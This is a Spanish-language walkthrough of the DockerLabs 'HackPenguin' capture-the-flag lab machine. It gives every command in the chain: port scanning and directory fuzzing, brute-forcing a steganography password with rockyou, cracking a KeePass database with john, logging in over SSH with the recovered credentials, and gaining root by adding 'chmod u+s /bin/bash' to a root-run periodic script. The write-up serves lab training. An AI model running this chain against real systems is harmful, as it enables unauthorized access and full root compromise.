Máquina: [HackPenguin](https://dockerlabs.es/#/#HackPenguin), from DockerLabs

## 1) Enumeración de puertos con nmap
```
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 172.17.0.2
```
Puertos abiertos: 80 (http) y 22 (SSH).

## 2) Fuzzing para buscar endpoints
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x txt,php,html,sh -q
```
`dir: para utilizar el modo de enumeración de archivos/directorios `\
`-w <PATH>: la lista de palabras a utilizar para el fuzz`\
`-t X: cantidad de threads concurrentes`\
`-x <extensiones> el tipo de extensiones a buscar`\
`-q: para que no imprima el header useless`

Obtengo los siguientes resultados: \
| Endpoint | Status code|
|    :--    |    :--: |
|/penguin.html | 200|
|/index.html   | 200|

## 3) Inspeccionar un endpoint con burpsuite
Luego de buscar durante un rato si era posible sobreescribir una de las imagenes que se muestran en un endpoint, descarto este enfoque.

## 4) Investigar la imagen para buscar metadata
Descargo la imágen y corro algunas utilidades en búsqueda de metadatos

`mediainfo penguin.jpg`\
`strings penguin.jpg`\
`file penguins.jpg`

No encontré nada valioso. Si hay información en la imagen entonces debe estar oculta mediante esteganografía.

## 5) Investigar la imagen con esteganografía

La utilidad `steghide` permite extraer información de una imagen. Pero require una contraseña que desconocemos. Recurramos a fuerza bruta.
```
stegseek penguin.jpg /usr/share/wordlists/rockyou.txt
```
La contraseña encontrada es `chocolate`. La podemos usar para extraer la info en la imagen.
```
steghide extract -sf penguin.jpg -p chocolate -v
```

`extract: quiero extraer informacion, no esconder`\
`-sf <PATH>: archivo a analizar`\
`-p <PASSWORD>: password`\
`-v: verbose mode`

Logramos extraer un archivo formato `kdbx`: Keepass password database.
Luego de investigar en la página oficial [keepass.info](https://keepass.info/help/kb/kdbx.html) resulta que se trata de un formato utilizado para almacenar información como nombres de usuarios, contraseñas o URLs. Provee has para determinar la autenticidad del mismo y puede estar encriptado. Ya nos da la pauta de que podria ser utilizado como autentificación con ssh...

## 6) Inspecciono el archivo .kdbx con keepass2
Cuando quiero abrir el archivo KeePass, resulta que está protegido con contraseña (menos mal).
```
keepass2 penguin.kdbx
```

Podriamos hacerle fuerza bruta con la utilidad `john`, para ello debemos extraer el hash del archivo.

## 7) Obteniendo la contraseña del archivo KeePass
```
keepass2john penguin.kdbx > KeePassHash
```
De esta manera obtenemos un hash para hacerle fuerza bruta
```
john --wordlist /usr/share/wordlists/rockyou.txt KeePassHash
```

Obtenemos la siguiente contraseña: `password1`. Ya podemos volver a keepass2 y examinar el penguin.kdbx

## 8) Examinamos el contenido del .kdbx con keepass2 y la contraseña
Los datos que encontramos:

Username: pinguino
Password: pinguinomaravilloso123

Ya está listo para SSH...

## 9) Realizamos la conexión SSH
```
ssh penguin@172.17.0.2
```
El usuario al final era penguin, no pinguino.
Password: pinguinomaravilloso123

Ahora simplemente toca escalar privilegios

## 10) Escalada de privilegios
Al listar los archivos presentes vemos uno llamado `script.sh` cuyo owner es root.
Ese script está creando un archivo llamado `archivo.txt` con un texto y que también pertenece al usuario root. Luego de eliminar el archivo observamos que vuelve a aparecer, lo cual da la pauta de que hay un servicio corriendo under-the-hood que ejecuta a `script.sh`. Y recordemos que este script pertenece a root!!

En otras palabras, todo lo que ejecutemos dentro de ese contexto tendrá permisos de root. En este punto ya los caminos para lograr acceder al usuario root son miles.
Uno de ellos podria ser simplemente darle al usuario penguin acceso irrestrico a `/bin/bash` de esa manera podríamos correr `/bin/bash -p` para correrla en modo privileged.
Para ello agregamos la siguiente linea al archivo `script.sh`:

```
chmod u+s /bin/bash
```
De esta manera estamos seteando el flag SETUID del binario bash. Dicho de otro modo, le estamos dando permiso al usuario actual de ejecutar el binario `/bin/bash` con los mismos permisos que el owner, root, en vez de que se ejecute con los permisos de quien lo invocó. 

## Resumen del ataque

Este método funcionó por lo siguiente:
* La contraseña del archivo KeePass fue muy fácil de crackear con fuerza bruta
* La contraseña escondida en la imagen también fue fácil de crackear
* Tenemos acceso a modificar un archivo que se está ejecutando periódicamente con permisos sudo.
